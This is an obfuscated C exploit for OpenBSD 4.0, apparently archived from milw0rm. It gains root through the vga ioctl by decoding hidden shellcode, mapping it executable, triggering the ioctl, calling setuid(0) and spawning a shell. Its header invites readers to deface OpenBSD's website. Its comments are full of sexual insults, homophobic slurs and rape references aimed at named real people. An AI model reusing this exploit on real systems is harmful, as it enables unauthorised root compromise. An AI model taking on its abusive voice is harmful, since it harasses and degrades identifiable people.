/*
 *      [ A PRODUCTION OF LUL-DISLCOSURE INC. ]
 *                         PROUDLY PRESENTS...
 *
 *                                     888                    888 
 *                                     888                    888 
 *                                     888                    888 
 *  .d88b.  88888b.   .d88b.  88888b.  88888b.  .d8888b   .d88888 
 * d88""88b 888 "88b d8P  Y8b 888 "88b 888 "88b 88K      d88" 888 
 * 888  888 888  888 88888888 888  888 888  888 "Y8888b. 888  888 
 * Y88..88P 888 d88P Y8b.     888  888 888 d88P      X88 Y88b 888 
 *  "Y88P"  88888P"   "Y8888  888  888 88888P"   88888P'  "Y88888 
 *          888                                                   
 *          888                                                   
 *          888                      DID YOU EVER FEEL THE RUSH...
 *                     d8b d8b              ...FOR JIZZ?     
 *                     Y8P Y8P
 *                                               
 *                    8888 888 88888888 88888888 
 *                    "888 888    d88P     d88P  
 *                     888 888   d88P     d88P   
 *                     888 888  d88P     d88P    
 *                     888 888 88888888 88888888 
 *                     888                       
 *                    d88P                       
 *                  888P"
 *
 * My final contribution, DA WORLD'S FIRST ANIMATED EXPLOIT!, is the foundation
 * for the next generation of OpenBSD exploits, crafted to burn Theo's eyes and make
 * him spend countless hours not only exercising his supreme reversing skills
 * but also delay his already deadly slow patch release timing. Hopefully every
 * fucktard out there willing to release an exploit for one of the many OpenBSD
 * locally exploitable issues, will give this insanely advanced code a good use.
 * Make sure you include some sanity checks (ie. if uid == 0 and hostname ==
 * cvs.openbsd.org make it do something creative like updating their index.html
 * once in a while).
 *
 * I would like to thank the following people for all the support, fun and
 * inspiration during my pilgrimage through the incredibly broken community known
 * as the security industry:
 *      Jesus H. Christ, Brute Dong, Bob, GOBBLES, towlie, noir and spender.
 *
 * I could name several people that I would love to either curbstomp or rape
 * anally (enjoying every inch of their rectum, though many of them would enjoy
 * the experience too, i know you dig dicks guys!), but I'll be a nice kid and
 * simply say that I love how this hdm, jf, FAilja, et al are nothing but
 * cock monglers. I enjoy how some of them have lost their jobs or got banned
 * by US immigration. And I also thank McDonalds for making you fatfucks get more
 * obese and ugly every year. And I'm sorry for the poor strippers that have to
 * stand the reality of being the only thing ressembling a woman you've ever had
 * the opportunity to see naked, besides your crack head cock-gobbling mom when
 * she sodomized you with a chop stick (and we know you liked it).
 * Hehehehe. BANANA! BANANA! BANANA! BTW, has gadi evron stopped crying for cocks
 * on craigslist men seeking men board? That fat fuck is sick. LULZ!
 *
 * OpenBSD is obsolete, aged, poorly designed, worsly developed and horribly
 * maintained. And led by a guy who needs to take his head out of his frozen
 * Canadian ass. FUCK YOU THEO, I'VE GOT YOUR DARPA FUNDING!
 *
 * This exploit abuses an old bug to gain root privileges on an OpenBSD 4.0
 * system. The ipv6 bug was never fully implemented because this shit made
 * me get a brain tumor. FUCK YOU THEO! LULZ LULZ LULZ LULZ LULZ LULZ LULZ
 *
 *  -- 2008 - by LMH
 *
 */
#include /*pax*/<string.h>/*drepper libc rocking on*//**//**//**//**//**//*   */
#include /*It seems to me so strange*/<stdlib.h>/*tax*//**//**//**//**//**//* */
#include /*aint*/<stdio.h>/*mmap NULL rocking the kernel on*//**//**//**//**//**/
#include /*Check wallet for her name*/<unistd.h>/*lax!*//**//**//**//**//**//**/
#include /*Her face is in the muck*/<sys/param.h>/**//**//**//**//**//**//* * */
#include /*Her face is in the muck*/<err.h>/**//**//**//**//**//**//**//**//* */
#include /*I think her zippers stuck*/<sys/ioctl.h>/*death    OPENBSD SECURE  */
#include /*It is perfect for me*/<sys/syscall.h>/*threats    THANKS TO PAX    */
#include /*To practice surgery*/<fcntl.h>/**//**//*  #########   BUY   */
#include /*One look coagulates*/<sys/types.h>/*mail ##horror##    ### SPENDER */
#include /*Its time to operate*/<sys/stat.h>/*arrives #sick###    ### A NEW   */
#include /*Just keep it going*/<sys/mman.h>/*pain ###pain#####    ### POSTER! */
#include /*Just keep it going*/<sys/sysctl.h>/*feels ##dumb###    ############*/
#define /*Just keep it going*/ma main/*theo: ##feels########## ance M  #######*/
#define /*Shes not dead, shes gonna live*/s /*fuck*/stdout/*##   Havok #######*/
#define /*Shes not dead, shes gonna live*/x fflush/*the ######################*/
#define /*I see her eyes rolling back in her head*/_s /*pain*/sleep/* GG NOIR */
#define /*Come on lets take her home*/f for/**//**//**//**//**//**//**//**//* */
#define /*I think i heard her groan*/v /*what*/void/**//**//**//**//**//**//* */
#define /*Hold on or she will sink*/__0 while/**//**//**//**//**//**//**//*   */
#define /*Just keep it going*/_c /*is*/char/*acter issues*//**//**//**//**//* */
#define /*You can fake it*/_____ sizeof/**//**//**//**//**//**//*  *//**//*   */
#define /*It's time to operate*/____ /*the*/printf/**//**//**//**//**//**//*  */
#define /*It's time to operate*/___ return/**//**//**//**//**//**//*  *//**//**/
#define /*It's time to operate*/__ /*of*/int/**//**//**//**//**//**//**//**//**/
#define /*It's time to operate*/_t static/**//**//**//**//**//**//**//**//*   */
#define /*It's time to operate*/_ki struct kinfo_proc/**//**//**//**//**//*   */
#define /*It's time to operate*/_pi pid_t/**//**//**//**//**//**//*   *//**//**/
#define /*It's time to operate*/______ unsigned int/**//**//**//**//**//**//* */
#define /*It's time to operate*/_______ err/**//**//**//**//**//**//*  *//*   */
#define /*It's time to operate*/__ki exit/**//**//**//**//**//**//*  *//**//* */
#define /*It's time to operate*/__sy sysctl/**//**//**//**//**//**//*  *//*   */
#define /*Heroin winner cup.*/ctkrn (__)0x00000000/**//**//**//**//**//**//*  */
#define /*It's time to operate*/kproc (__)0x0000000E/**//**//**//**//**//**//**/
#define /*Inject. Overdose. End.*/kppid (__)(/**/ctkrn+/**/0x00000001)/**//*  */
#define /*That cigar tube smells like lost elections*/dirtysanchez mmap/**//* */
#define /*It's time to operate*/________/**/printf/**//**//**//**//**//**//*  */
#define /*It's time to operate*/_________/**/unsigned long/**//**//**//**//*  */
#define /*It's time to operate*/_m/**/memcpy/**//**//**//**//**//**//**//*    */
#define /*It's time to operate*/__________/**/setuid/**//**//**//**//**//**//**/
#define /*It's time to operate*/___________/**/seteuid/**//**//**//**//**//*  */
#define /*It's time to operate*/____________/**/execl/**//**//**//**//**//*   */
#define aaaaaaaaaaaaaaaa O_RDWR
#define ____rw_c_ (aaaaaaaaaaaaaaaa|O_CREAT)
#define ____se_e_ (S_IRUSR|S_IWUSR)
#define reopen close
#define _w_w_w_w_w_w_w_w write
#define meltwax  PROT_READ|PROT_EXEC
#define raadt MAP_FIXED
#define openbsdsec MAP_FAILED
#define molest syscall
#define provos SYS_ioctl

_c macaddr[]=""; // Used for ICMPv6 exploit: VMWare network interface mac addr

/* many years... *Theo sheds a FREE tear* Sigh.
===================================================================
RCS file: /usr/OpenBSD/cvs/www/index.html,v
retrieving revision 1.548
retrieving revision 1.549
diff -u -r1.548 -r1.549
--- www/index.html	2007/03/12 17:21:59	1.548
+++ www/index.html	2007/03/13 22:39:47	1.549
@@ -78,7 +78,7 @@
 	<a href="art1.html"><img border="0" src="images/puffy40.gif" height=199
 <br>
 <center><strong><font color="#e00000">
-Only one remote hole in the default install, in more than 10 years!<br>
+Only two remote holes in the default install, in more than 10 years!<br>
 </font></strong></center>
 <p>
 The OpenBSD project produces a <b>FREE</b>, multi-platform 4.4BSD-based
*/

_c shlr[]="\xc9\xd1\xd1\xd1\xc9\xd1\xd1\xd1\xc9\xd1\xd1\xd1\xc9\xd1\xd1\xd1\xc9"
"\xd1\xd1\xd1\xc9\xd1\xd1\xd1\x39\xde\xd1\xd1\xd1\xa9\x87\xe5\xc3\x2f\x1b\x7c"//
"\x0f\x7c\x0f\x3e\x6f\x41\x41\x41\x8e\x5a\xde\x5a\x88\xc1\xe0\x11\x58\x92\xd5"//
"\x5a\xc2\x58\x93\xd5\x69\x80\x96\x99\x01\x2e\x31\xd1"; double obsdv;_________//
mg1=0x21524110;_________ mg2=0xcc99e897;_________ mg3=0xffffffff;_________ mg4=
0x12345678;_c shl[]="\x85\xc8\xc3\xc4\x85\xd9\xc2\xaa";v gpr(_pi dp,_ki *kp);///
_c tks[]="\x6e\x35\x2c\x31\x6e\x35\x29\x24\x2e\x6f\x19\x19\x19\x19\x19\x41";_c
gde[]="\x00\x4b\x4a\x59\x00\x5b\x5b\x56\x6c\x1f\x2f";

_t v evi(){_________ rts[2]={0xee5f9be,0xebdfc46};__ i,moo,moooo;v *p;_________
ppa;_ki kp;rts[0]=rts[0]^(mg1^mg3);rts[1]=rts[1]^(mg2^mg4);gpr((_pi)getpid(),//
&kp);ppa=(_________)kp.kp_eproc.e_paddr;shlr[24+5]=ppa&0xff;shlr[24+6]=(ppa>>8)&
0xff;shlr[24+7]=(ppa>>16)&0xff;shlr[24+8]=(ppa>>24)&0xff;____("\x5b\x2b\x5d\x20"
"\x53\x68\x65\x6c\x6c\x63\x6f\x64\x65\x3a\x20""%u bytes at %p\x0a",(unsigned)//
_____(shlr),&shlr);moo=mkstemp(tks);if(moo<0){_______(1,"\x6f\x70\x65\x6e");}
_w_w_w_w_w_w_w_w(moo,shlr,_____(shlr));if((lseek(moo,0L,SEEK_SET))<0){_______(1,
"\x6c\x73\x65\x65\x6b");}p=dirtysanchez(0,_____(shlr),meltwax,raadt,moo,0);if(p
==openbsdsec){_______(1,"\x6d\x6d\x61\x70");}moooo=open(gde,O_RDWR);if(moooo<0){
munmap(p,_____(shlr));reopen(moo);_______(1,"\x6f\x70\x65\x6e");}molest(provos,
moooo,0x80044103,NULL);reopen(moooo);reopen(moo);___________(0);__________(ctkrn);
____________(shl,"sh",(v *)ctkrn);
}

double vobsd(){__ rg[2],l;_c *p;double re;rg[0]=CTL_KERN;rg[1]=KERN_OSRELEASE;
if(__sy(rg,2,NULL,(size_t *)&l,NULL,0)==-1){_______(1,"\x73\x79\x73\x63\x74\x6c"
);}if((p=malloc(l))==NULL){_______(1,NULL);}if(__sy(rg,2,p,(size_t *)&l,NULL,0)
==-1){_______(1,"\x73\x79\x73\x63\x74\x6c");}re=atof(p);____("\x5b\x2b\x5d\x20"
"\x4f\x70\x65\x6e\x42\x53\x44\x20\x72\x65\x6c\x65\x61\x73\x65\x20\x64\x65\x74"
"\x65\x63\x74\x65\x64\x3a\x20""%s (%f)\n",p,re);free(p);___ re;}v uss(){____(/**/
"\x4f\x70\x65\x6e\x42\x53\x44\x3a\x20\x4f\x6e\x6c\x79\x20\x73\x65\x63\x75\x72\x65"
"\x20\x69\x6e\x20\x73\x69\x6e\x67\x6c\x65\x20\x75\x73\x65\x72\x20\x65\x6e\x76\x69"
"\x72\x6f\x6e\x6d\x65\x6e\x74\x73\x20\x66\x6f\x72\x20\x6d\x6f\x72\x65\x20\x74\x68"
"\x61\x6e\x20\x31\x30\x20\x79\x65\x61\x72\x73\x21\x0a\x0a\x54\x61\x72\x67\x65\x74"
"\x20\x76\x75\x6c\x6e\x65\x72\x61\x62\x69\x6c\x69\x74\x79\x3a\x0a\x09\x76\x67\x61"
"\x3a\x20\x76\x67\x61\x5f\x69\x6f\x63\x74\x6c\x28\x29\x20\x6c\x6f\x63\x61\x6c\x20"
"\x65\x78\x70\x6c\x6f\x69\x74\x20\x20\x20\x28\x34\x2e\x30\x20\x61\x6e\x64\x20\x33"
"\x2e\x39\x20\x67\x65\x6e\x65\x72\x69\x63\x20\x69\x33\x38\x36\x29\x0a\x09\x69\x70"
"\x36\x34\x30\x3a\x20\x49\x43\x4d\x50\x76\x36\x20\x72\x65\x6d\x6f\x74\x65\x20\x65"
"\x78\x70\x6c\x6f\x69\x74\x20\x20\x20\x20\x20\x28\x34\x2e\x30\x20\x67\x65\x6e\x65"
"\x72\x69\x63\x20\x69\x33\x38\x36\x29\x20\x28\x72\x6f\x6f\x74\x20\x72\x65\x71\x75"
"\x69\x72\x65\x64\x21\x29\x0a\x0a\x44\x61\x72\x65\x20\x79\x6f\x75\x20\x74\x6f\x20"
"\x72\x75\x6e\x20\x74\x68\x69\x73\x20\x65\x78\x70\x6c\x6f\x69\x74\x20\x61\x73\x20"
"\x72\x6f\x6f\x74\x2e\x20\x4f\x70\x65\x6e\x42\x53\x0a\x0a");__ki(-1);}v gpr(_pi dp,
_ki *kp){__ rg[4],l;rg[0]=ctkrn;rg[1]=kproc;rg[2]=kppid;rg[3]=dp;l=_____(_ki);if(
__sy(rg,4,kp,(size_t *)&l,NULL,0)<0){_______(1,"\x73\x79\x73\x63\x74\x6c");_______
(1,"\x43\x6f\x75\x6c\x64\x20\x6e\x6f\x74\x20\x72\x65\x74\x72\x69\x65\x76\x65\x20"
"\x70\x72\x6f\x63\x20\x73\x74\x72\x75\x63\x74\x75\x72\x65\x21\x0a");}}_t v xo(_c
u[],______ l,__ k){______ i;f(i=0;i<l;i++){u[i]=u[i]^k;}}_t __ was=0;v pg(__ w,_c
*rr[],__ nz,__ wsn){__ i,b;_c *u=0;__0(was<wsn){f(i= 0;i<nz;i++){u=rr[i];f(b=0;b
<w;b++){____("\b");}____("%s",u);x(s);_s(1);}was++;}____("\n"/*A*/);/*{*/}/*r},v
*/__ ma(__ a,_c **g){_c *theosmovie[]={"\x53\x75\x63\x6b\x69\x6e\x67"/**//**//**/
"\x20\x6f\x6e\x20\x6d\x79\x20\x74\x69\x74\x74\x69\x65\x73\x20\x6c\x69\x6b\x65\x20"
"\x79\x6f\x75\x20\x77\x61\x6e\x74\x65\x64\x20\x6d\x65\x20\x20\x20\x20\x20\x20\x20"
"\x20\x20\x20\x20","\x43\x61\x6c\x6c\x69\x6e\x67\x20\x6d\x65\x2c\x20\x61\x6c\x6c"
"\x20\x74\x68\x65\x20\x74\x69\x6d\x65\x20\x6c\x69\x6b\x65\x20\x42\x6c\x6f\x6e\x64"
"\x69\x65\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x43\x68\x65"
"\x63\x6b\x20\x6f\x75\x74\x20\x6d\x79\x20\x63\x68\x72\x69\x73\x73\x79\x20\x62\x65"
"\x68\x69\x6e\x64\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
"\x20\x20\x20\x20\x20\x20\x20\x20","\x49\x74\x27\x73\x20\x66\x69\x6e\x65\x20\x61"
"\x6c\x6c\x20\x6f\x66\x20\x74\x68\x65\x20\x74\x69\x6d\x65\x20\x20\x20\x20\x20\x20"
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
,"\x4c\x69\x6b\x65\x20\x73\x65\x78\x20\x6f\x6e\x20\x74\x68\x65\x20\x62\x65\x61\x63"
"\x68\x65\x73\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x57\x68\x61\x74\x20\x65\x6c\x73"
"\x65\x20\x69\x73\x20\x69\x6e\x20\x74\x68\x65\x20\x74\x65\x61\x63\x68\x65\x73\x20"
"\x6f\x66\x20\x70\x65\x61\x63\x68\x65\x73\x3f\x20\x48\x75\x68\x3f\x20\x57\x68\x61"
"\x74\x3f\x20","\x48\x75\x68\x3f\x20\x52\x69\x67\x68\x74\x2e\x20\x57\x68\x61\x74"
"\x3f\x20\x55\x68\x68\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x48\x75\x68\x3f"
"\x20\x52\x69\x67\x68\x74\x2e\x20\x57\x68\x61\x74\x3f\x20\x55\x68\x68\x3f\x20\x20"
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
"\x20\x20\x20\x20\x20\x20\x20","\x53\x49\x53\x20\x49\x55\x44\x2c\x20\x73\x74\x61"
"\x79\x20\x69\x6e\x20\x73\x63\x68\x6f\x6f\x6c\x20\x27\x63\x61\x75\x73\x65\x20\x69"
"\x74\x27\x73\x20\x74\x68\x65\x20\x62\x65\x73\x74\x20\x20\x20\x20\x20\x20\x20",
"\x49\x55\x44\x20\x53\x49\x53\x2c\x20\x73\x74\x61\x79\x20\x69\x6e\x20\x73\x63\x68"
"\x6f\x6f\x6c\x20\x27\x63\x61\x75\x73\x65\x20\x69\x74\x27\x73\x20\x74\x68\x65\x20"
"\x62\x65\x73\x74\x20\x20\x20\x20\x20\x20\x20","\x53\x49\x53\x20\x49\x55\x44\x2c"
"\x20\x73\x74\x61\x79\x20\x69\x6e\x20\x73\x63\x68\x6f\x6f\x6c\x20\x27\x63\x61\x75"
"\x73\x65\x20\x69\x74\x27\x73\x20\x74\x68\x65\x20\x62\x65\x73\x74\x20\x20\x20\x20"
"\x20\x20\x20","Fuck the pain away? Fuck the pain away!\x20\x20\x20\x20\x20\x20"
"\x20\x20\x20\x20\x20\x20","Fuck the pain away! Fuck the pain away?\x20\x20\x20"
"\x20\x20\x20\x20\x20\x20\x20\x20\x20","Fuck the 0day away. Fuck the pain away!"
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","Fuck the pain away! Fuck the"
" pain away?\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","Fuck the 0day aw"
"ay? Fuck the pain away!\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"};____(
"\033[2J\x20\x20\x5f\x5f\x5f\x20\x20\x20\x20\x20\x20\x20\x4f\x70\x65\x6e\x42\x53"
"\x44\x20\x4d\x6f\x76\x69\x65\x20\x62\x79\x20\x54\x68\x65\x6f\x20\x64\x65\x20\x52"
"\x61\x61\x64\x74\x0a\x20\x2f\x2f\x20\x20\x37\x20\x20\x20\x20\x20\x20\x53\x74\x61"
"\x72\x72\x69\x6e\x67\x2e\x2e\x2e\x0a\x28\x5f\x2c\x5f\x2f\x5c\x20\x20\x20\x20\x20"
"\x20\x20\x20\x20\x20\x20\x20\x20\x2e\x2e\x2e\x68\x69\x6d\x73\x65\x6c\x66\x21\x0a"
"\x20\x5c\x20\x20\x20\x20\x5c\x0a\x20\x20\x5c\x20\x20\x20\x20\x5c\x20\x20\x20\x20"
"\x20\x42\x72\x6f\x75\x67\x68\x74\x20\x74\x6f\x20\x79\x6f\x75\x20\x62\x79\x2e\x2e"
"\x2e\x0a\x20\x20\x5f\x5c\x20\x20\x20\x20\x5c\x5f\x5f\x0a\x20\x28\x20\x20\x5c\x20"
"\x20\x20\x20\x20\x20\x29\x20\x20\x20\x20\x20\x54\x68\x65\x6f\x27\x73\x20\x6c\x6f"
"\x73\x74\x20\x44\x41\x52\x50\x41\x20\x66\x75\x6e\x64\x69\x6e\x67\x0a\x20\x20\x5c"
"\x5f\x5f\x5f\x5c\x5f\x5f\x5f\x2f\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x26"
"\x20\x50\x65\x61\x63\x68\x65\x73\x2e\x0a\x0a");/* Fuck the 0day away. */ if(a<2
){uss();}obsdv=vobsd();pg(80,theosmovie,_____(theosmovie)/_____(_c *),1);xo(shl,
_____(shl),shl[_____(shl)]);xo(shlr,_____(shlr),0xd1);xo(tks,_____(tks),0x41);xo(
gde,_____(gde), 0x2f);if(obsdv==4.0&&!strcmp(g[1],"vga")){evi();}

/*That's it.*/___ 0;}/*Easy to fingerprint, eh?*/

// milw0rm.com [2008-07-01]
